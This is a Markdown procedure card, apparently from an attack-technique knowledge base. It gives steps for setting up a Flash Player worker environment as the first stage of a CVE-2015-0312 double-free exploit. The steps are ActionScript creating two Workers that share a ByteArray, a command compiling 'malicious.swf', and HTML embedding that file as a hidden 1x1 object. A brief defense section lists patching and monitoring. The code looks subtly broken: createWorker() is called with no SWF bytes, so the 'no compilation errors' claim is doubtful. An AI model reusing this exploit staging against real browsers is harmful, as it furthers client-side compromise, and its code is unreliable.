---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567891
name: Setup-Flash-Worker-Environment
tags:
  - flash-player
  - workers
  - setup
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/mxmlc-compile-swf]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:24:18.621Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Setup-Flash-Worker-Environment

## Summary

This procedure sets up a malicious Adobe Flash Player environment using worker threads and a shared ByteArray, preparing for a race condition exploit that leads to a double free vulnerability.

## Description

In the context of CVE-2015-0312, this procedure involves compiling ActionScript code into a SWF file that initializes two Worker instances sharing a ByteArray. This shared state is crucial for inducing the race condition where synchronization fails during bytearray.compress() calls. The target environment is a web browser like Chrome with a vulnerable Flash Player version. Prerequisites include the Adobe Flex SDK for compilation and a development setup for testing. Expected outcomes include a functional SWF that loads workers without immediate crashes, setting the stage for exploitation.

## Requirements

1. Adobe Flex SDK installed for ActionScript compilation
2. Vulnerable Adobe Flash Player (version prior to patch for CVE-2015-0312)
3. Browser environment (e.g., Chrome) with Flash enabled
4. Basic knowledge of ActionScript 3.0 and Flash worker APIs

## Defense

Defensive measures and detection strategies:

- Patch Flash Player to version 17.0.0.169 or later
- Disable Flash in browsers or use sandboxed environments like Chrome's site isolation
- Monitor for anomalous Flash SWF loads via browser extensions or EDR tools

## Objectives

1. Compile and prepare a SWF file with shared worker ByteArray
2. Ensure workers can initialize and share data without errors
3. Validate setup in browser for exploit readiness

## Instructions

### Step 1: Write ActionScript Code

**Context**: Create the main ActionScript file (Main.as) that sets up workers and the shared ByteArray.

**Code Snippet** ([[commands/actionscript-worker-setup]]):

```actionscript
import flash.system.Worker;
import flash.system.WorkerDomain;
import flash.utils.ByteArray;

var byteArray:ByteArray = new ByteArray();
byteArray.shareable = true;
var worker1:Worker = WorkerDomain.current.createWorker();
var worker2:Worker = WorkerDomain.current.createWorker();
worker1.setSharedProperty("byteArray", byteArray);
worker2.setSharedProperty("byteArray", byteArray);
worker1.start();
worker2.start();
```

> This code initializes the shared ByteArray and starts the workers. Expected output: No compilation errors; workers running.

### Step 2: Compile to SWF

**Context**: Use mxmlc to build the SWF file.

**Command** ([[commands/mxmlc-compile-swf]]):
```bash
mxmlc -library-path+=/path/to/flashlibs Main.as -swf-version=18 -output=malicious.swf
```

> Compiles Main.as into malicious.swf. Expected output: Generated SWF file; verify with `file malicious.swf` showing Flash format.

### Step 3: Test Loading in Browser

**Context**: Embed and load the SWF in an HTML file to confirm setup.

**Code Snippet**:

```html
<!DOCTYPE html>
<html>
<body>
<object type="application/x-shockwave-flash" data="malicious.swf" width="1" height="1"></object>
</body>
</html>
```

> Open in Chrome; check DevTools console for Flash errors. Expected output: SWF loads without crashing.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/mxmlc-compile-swf]]
- [[commands/actionscript-worker-setup]]

## Tools Used


## Tags

- [[flash-player]]
- [[workers]]
- [[setup]]
